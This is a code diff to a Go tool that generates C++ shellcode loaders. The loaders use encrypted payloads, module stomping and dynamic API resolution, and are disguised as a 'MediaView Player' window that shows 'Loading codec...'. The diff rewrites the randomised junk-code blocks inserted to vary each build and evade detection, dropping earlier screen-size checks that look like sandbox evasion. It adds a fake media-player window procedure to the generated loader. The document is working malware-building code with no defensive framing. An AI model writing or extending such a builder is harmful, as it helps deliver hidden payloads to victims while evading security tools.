@@ -742,25 +742,20 @@ func callbackModuleStompDynCpp() string {
 
 func callbackJunkBlock() string {
 	blocks := []string{
-		"{SYSTEM_INFO _si;GetSystemInfo(&_si);volatile DWORD _np=_si.dwNumberOfProcessors;(void)_np;}\n",
-		"{MEMORYSTATUSEX _ms;_ms.dwLength=sizeof(_ms);GlobalMemoryStatusEx(&_ms);volatile DWORD _ml=_ms.dwMemoryLoad;(void)_ml;}\n",
-		"{LARGE_INTEGER _f,_c;QueryPerformanceFrequency(&_f);QueryPerformanceCounter(&_c);volatile int64_t _d=_c.QuadPart/_f.QuadPart;(void)_d;}\n",
-		"{volatile DWORD _v=GetVersion();volatile DWORD _mj=LOBYTE(LOWORD(_v));(void)_mj;}\n",
-		"{HDC _dc=GetDC(NULL);int _bp=GetDeviceCaps(_dc,BITSPIXEL);int _vr=GetDeviceCaps(_dc,VREFRESH);ReleaseDC(NULL,_dc);if(_bp<16||_vr<30)Sleep(0);}\n",
-		"{int _sw=GetSystemMetrics(SM_CXSCREEN);int _sh=GetSystemMetrics(SM_CYSCREEN);if(_sw<800||_sh<600)Sleep(0);}\n",
-		"{FILETIME _ft;GetSystemTimeAsFileTime(&_ft);volatile DWORD _lo=_ft.dwLowDateTime;(void)_lo;}\n",
+		"{wchar_t _p[MAX_PATH];GetModuleFileNameW(NULL,_p,MAX_PATH);volatile int _l=lstrlenW(_p);(void)_l;}\n",
+		"{wchar_t _ln[64];GetLocaleInfoW(LOCALE_USER_DEFAULT,0x5c,_ln,64);volatile int _l=lstrlenW(_ln);(void)_l;}\n",
+		"{wchar_t _tp[MAX_PATH];GetTempPathW(MAX_PATH,_tp);volatile int _tl=lstrlenW(_tp);(void)_tl;}\n",
+		"{wchar_t _cd[MAX_PATH];GetCurrentDirectoryW(MAX_PATH,_cd);volatile int _cl=lstrlenW(_cd);(void)_cl;}\n",
+		"{volatile DWORD _tid=GetCurrentThreadId();volatile DWORD _pid=GetCurrentProcessId();(void)_tid;(void)_pid;}\n",
+		"{HCURSOR _hc=LoadCursorW(NULL,IDC_ARROW);volatile BOOL _ok=(_hc!=NULL);(void)_ok;}\n",
+		"{volatile UINT _cp=GetACP();volatile UINT _ocp=GetOEMCP();(void)_cp;(void)_ocp;}\n",
 	}
-	var b [2]byte
+	var b [1]byte
 	rand.Read(b[:])
-	n := 2 + int(b[0])%2
+	start := int(b[0]) % len(blocks)
 	var sb strings.Builder
-	used := make(map[int]bool)
-	for i := 0; i < n; i++ {
-		idx := int(b[1]+byte(i)*37) % len(blocks)
-		for used[idx] {
-			idx = (idx + 1) % len(blocks)
-		}
-		used[idx] = true
+	for i := 0; i < len(blocks); i++ {
+		idx := (start + i) % len(blocks)
 		sb.WriteString("    ")
 		sb.WriteString(blocks[idx])
 	}
@@ -901,13 +896,23 @@ func oxuGenerateLoaderEclCallback(encodedData []byte, encSize, realSize int, key
 		sb.WriteString(inflateCpp)
 	}
 	writeResLoaderCode(&sb, encSize, realSize, 0)
+	sb.WriteString("static LRESULT CALLBACK MediaWndProc(HWND hwnd,UINT msg,WPARAM wp,LPARAM lp){\n")
+	sb.WriteString("    switch(msg){\n")
+	sb.WriteString("    case WM_PAINT:{PAINTSTRUCT ps;HDC hdc=BeginPaint(hwnd,&ps);\n")
+	sb.WriteString("        RECT rc;GetClientRect(hwnd,&rc);\n")
+	sb.WriteString("        HBRUSH hBg=CreateSolidBrush(RGB(32,32,32));FillRect(hdc,&rc,hBg);DeleteObject(hBg);\n")
+	sb.WriteString("        SetTextColor(hdc,RGB(200,200,200));SetBkMode(hdc,TRANSPARENT);\n")
+	sb.WriteString("        DrawTextW(hdc,L\"Loading codec...\",-1,&rc,DT_CENTER|DT_VCENTER|DT_SINGLELINE);\n")
+	sb.WriteString("        EndPaint(hwnd,&ps);return 0;}\n")
+	sb.WriteString("    case WM_CLOSE:PostQuitMessage(0);return 0;\n")
+	sb.WriteString("    }return DefWindowProcW(hwnd,msg,wp,lp);\n}\n\n")
 	if embedKey {
 		sb.WriteString(fmt.Sprintf("static const char g_key[] = \"%s\";\n\n", key))
 		sb.WriteString("int WINAPI wWinMain(HINSTANCE hInst, HINSTANCE, LPWSTR, int) {\n")
 		sb.WriteString("    volatile int _t = (int)strlen(g_CodecInfo); (void)_t;\n")
 		sb.WriteString(callbackJunkBlock())
 		sb.WriteString("    if(!_ra()) return 0;\n")
-		sb.WriteString("    WNDCLASSEXW wc={sizeof(wc)};wc.lpfnWndProc=DefWindowProcW;wc.hInstance=hInst;wc.hbrBackground=(HBRUSH)GetStockObject(4);wc.lpszClassName=L\"MediaViewPlayer\";\n")
+		sb.WriteString("    WNDCLASSEXW wc={sizeof(wc)};wc.lpfnWndProc=MediaWndProc;wc.hInstance=hInst;wc.hbrBackground=(HBRUSH)GetStockObject(4);wc.lpszClassName=L\"MediaViewPlayer\";\n")
 		sb.WriteString("    RegisterClassExW(&wc);HWND hw=CreateWindowExW(0,L\"MediaViewPlayer\",L\"MediaView Player\",WS_OVERLAPPEDWINDOW,100,100,854,480,NULL,NULL,hInst,NULL);\n")
 		sb.WriteString("    ShowWindow(hw,SW_SHOW);UpdateWindow(hw);\n")
 		sb.WriteString(callbackJunkBlock())
@@ -921,7 +926,7 @@ func oxuGenerateLoaderEclCallback(encodedData []byte, encSize, realSize int, key
 		sb.WriteString("    volatile int _t = (int)strlen(g_CodecInfo); (void)_t;\n")
 		sb.WriteString(callbackJunkBlock())
 		sb.WriteString("    if(!_ra()) return 0;\n")
-		sb.WriteString("    WNDCLASSEXW wc={sizeof(wc)};wc.lpfnWndProc=DefWindowProcW;wc.hInstance=hInst;wc.hbrBackground=(HBRUSH)GetStockObject(4);wc.lpszClassName=L\"MediaViewPlayer\";\n")
+		sb.WriteString("    WNDCLASSEXW wc={sizeof(wc)};wc.lpfnWndProc=MediaWndProc;wc.hInstance=hInst;wc.hbrBackground=(HBRUSH)GetStockObject(4);wc.lpszClassName=L\"MediaViewPlayer\";\n")
 		sb.WriteString("    RegisterClassExW(&wc);HWND hw=CreateWindowExW(0,L\"MediaViewPlayer\",L\"MediaView Player\",WS_OVERLAPPEDWINDOW,100,100,854,480,NULL,NULL,hInst,NULL);\n")
 		sb.WriteString("    ShowWindow(hw,SW_SHOW);UpdateWindow(hw);\n")
 		sb.WriteString(callbackJunkBlock())
@@ -960,6 +965,16 @@ func oxuGenerateLoaderRsaCallback(encryptedShellcode []byte, encSize, realSize i
 	sb.WriteString(callbackSemanticPad)
 	sb.WriteString(callbackDynAPICpp())
 	writeResLoaderCode(&sb, encSize, realSize, 0)
+	sb.WriteString("static LRESULT CALLBACK MediaWndProc(HWND hwnd,UINT msg,WPARAM wp,LPARAM lp){\n")
+	sb.WriteString("    switch(msg){\n")
+	sb.WriteString("    case WM_PAINT:{PAINTSTRUCT ps;HDC hdc=BeginPaint(hwnd,&ps);\n")
+	sb.WriteString("        RECT rc;GetClientRect(hwnd,&rc);\n")
+	sb.WriteString("        HBRUSH hBg=CreateSolidBrush(RGB(32,32,32));FillRect(hdc,&rc,hBg);DeleteObject(hBg);\n")
+	sb.WriteString("        SetTextColor(hdc,RGB(200,200,200));SetBkMode(hdc,TRANSPARENT);\n")
+	sb.WriteString("        DrawTextW(hdc,L\"Loading codec...\",-1,&rc,DT_CENTER|DT_VCENTER|DT_SINGLELINE);\n")
+	sb.WriteString("        EndPaint(hwnd,&ps);return 0;}\n")
+	sb.WriteString("    case WM_CLOSE:PostQuitMessage(0);return 0;\n")
+	sb.WriteString("    }return DefWindowProcW(hwnd,msg,wp,lp);\n}\n\n")
 	if embedKey {
 		escapedKey := strings.ReplaceAll(privateKey, `\`, `\\`)
 		sb.WriteString(fmt.Sprintf("static const char g_private_key[] = \"%s\";\n\n", escapedKey))
@@ -967,7 +982,7 @@ func oxuGenerateLoaderRsaCallback(encryptedShellcode []byte, encSize, realSize i
 		sb.WriteString("    volatile int _t = (int)strlen(g_CodecInfo); (void)_t;\n")
 		sb.WriteString(callbackJunkBlock())
 		sb.WriteString("    if(!_ra()) return 0;\n")
-		sb.WriteString("    WNDCLASSEXW wc={sizeof(wc)};wc.lpfnWndProc=DefWindowProcW;wc.hInstance=hInst;wc.hbrBackground=(HBRUSH)GetStockObject(4);wc.lpszClassName=L\"MediaViewPlayer\";\n")
+		sb.WriteString("    WNDCLASSEXW wc={sizeof(wc)};wc.lpfnWndProc=MediaWndProc;wc.hInstance=hInst;wc.hbrBackground=(HBRUSH)GetStockObject(4);wc.lpszClassName=L\"MediaViewPlayer\";\n")
 		sb.WriteString("    RegisterClassExW(&wc);HWND hw=CreateWindowExW(0,L\"MediaViewPlayer\",L\"MediaView Player\",WS_OVERLAPPEDWINDOW,100,100,854,480,NULL,NULL,hInst,NULL);\n")
 		sb.WriteString("    ShowWindow(hw,SW_SHOW);UpdateWindow(hw);\n")
 		sb.WriteString(callbackJunkBlock())
@@ -980,7 +995,7 @@ func oxuGenerateLoaderRsaCallback(encryptedShellcode []byte, encSize, realSize i
 		sb.WriteString("    volatile int _t = (int)strlen(g_CodecInfo); (void)_t;\n")
 		sb.WriteString(callbackJunkBlock())
 		sb.WriteString("    if(!_ra()) return 0;\n")
-		sb.WriteString("    WNDCLASSEXW wc={sizeof(wc)};wc.lpfnWndProc=DefWindowProcW;wc.hInstance=hInst;wc.hbrBackground=(HBRUSH)GetStockObject(4);wc.lpszClassName=L\"MediaViewPlayer\";\n")
+		sb.WriteString("    WNDCLASSEXW wc={sizeof(wc)};wc.lpfnWndProc=MediaWndProc;wc.hInstance=hInst;wc.hbrBackground=(HBRUSH)GetStockObject(4);wc.lpszClassName=L\"MediaViewPlayer\";\n")
 		sb.WriteString("    RegisterClassExW(&wc);HWND hw=CreateWindowExW(0,L\"MediaViewPlayer\",L\"MediaView Player\",WS_OVERLAPPEDWINDOW,100,100,854,480,NULL,NULL,hInst,NULL);\n")
 		sb.WriteString("    ShowWindow(hw,SW_SHOW);UpdateWindow(hw);\n")
 		sb.WriteString(callbackJunkBlock())
